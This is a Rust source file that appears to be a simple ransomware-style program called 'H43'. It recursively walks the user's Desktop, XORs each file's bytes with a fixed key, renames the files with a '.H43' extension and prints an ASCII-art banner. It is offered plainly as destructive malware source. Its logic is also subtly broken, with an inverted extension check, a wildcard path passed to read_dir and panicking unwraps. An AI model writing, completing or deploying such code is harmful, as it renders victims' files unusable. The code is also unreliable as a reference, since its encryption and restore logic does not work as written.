use std::env;
use std::fs;
use std::path::Path;

const RELATIVE_FOLDER: &str = "\\Desktop"; // 0 - User's path
const CRYPTO_NUM: u8 = 21;
const CRYPTO_EXT: &str = ".H43";
const CRYPTO_EXT_LEN: usize = 4;
const CRYPTO_ENV_NAME: &str = "H43_xor_encryption";
const CRYPTO_ENV_VALUE: &str = "H43";

fn print_ascii_art() {
    println!(
        "\n\n\
        \t\t\tHHHHHHHHH     HHHHHHHHH       444444444   333333333333333\n\
        \t\t\tH:::::::H     H:::::::H      4::::::::4  3:::::::::::::::33\n\
        \t\t\tH:::::::H     H:::::::H     4:::::::::4  3::::::33333::::::3\n\
        \t\t\tHH::::::H     H::::::HH    4::::44::::4  3333333     3:::::3\n\
        \t\t\t  H:::::H     H:::::H     4::::4 4::::4              3:::::3\n\
        \t\t\t  H:::::H     H:::::H    4::::4  4::::4              3:::::3\n\
        \t\t\t  H::::::HHHHH::::::H   4::::4   4::::4      33333333:::::3\n\
        \t\t\t  H:::::::::::::::::H  4::::444444::::444    3:::::::::::3\n\
        \t\t\t  H:::::::::::::::::H  4::::::::::::::::4    33333333:::::3\n\
        \t\t\t  H::::::HHHHH::::::H  4444444444:::::444            3:::::3\n\
        \t\t\t  H:::::H     H:::::H            4::::4              3:::::3\n\
        \t\t\t  H:::::H     H:::::H            4::::4              3:::::3\n\
        \t\t\tHH::::::H     H::::::HH          4::::4  3333333     3:::::3\n\
        \t\t\tH:::::::H     H:::::::H        44::::::443::::::33333::::::3\n\
        \t\t\tH:::::::H     H:::::::H        4::::::::43:::::::::::::::33\n\
        \t\t\tHHHHHHHHH     HHHHHHHHH        4444444444 333333333333333\n\n\n"
    );
}

fn xor_encryption(file: &str) {
    let ext = Path::new(file).extension().and_then(|ext| ext.to_str());
    let encrypt = match ext {
        Some(ext) => encrypt_file(ext),
        None => return,
    };
    let content = fs::read(file).unwrap();
    let encrypted_content: Vec<u8> = content
        .iter()
        .map(|byte| byte ^ CRYPTO_NUM)
        .collect();
    fs::write(file, encrypted_content).unwrap();
    if encrypt {
        let new_file = format!("{}{}", file, CRYPTO_EXT);
        fs::rename(file, new_file).unwrap();
    } else {
        let new_file = Path::new(file)
            .with_extension("")
            .to_str()
            .unwrap()
            .to_owned();
        fs::rename(file, new_file).unwrap();
    }
}

fn encrypt_file(ext: &str) -> bool {
    ext == CRYPTO_EXT
}

fn files_tree(folder: &str) {
    let wildcard = format!("{}\\*", folder);
    let entries = fs::read_dir(wildcard).unwrap();
    for entry in entries {
        let entry = entry.unwrap();
        let path = entry.path();
        if path.is_dir() {
            files_tree(path.to_str().unwrap());
        } else if path.is_file() {
            xor_encryption(path.to_str().unwrap());
        }
    }
}

fn main() {
    let env = env::var(CRYPTO_ENV_NAME).unwrap();
    if env != CRYPTO_ENV_VALUE {
        let home_path = env::var("USERPROFILE").unwrap();
        let path = if RELATIVE_FOLDER.is_empty() {
            home_path.clone()
        } else {
            format!("{}{}", home_path, RELATIVE_FOLDER)
        };
        files_tree(&path);
    }
    print_ascii_art();
}
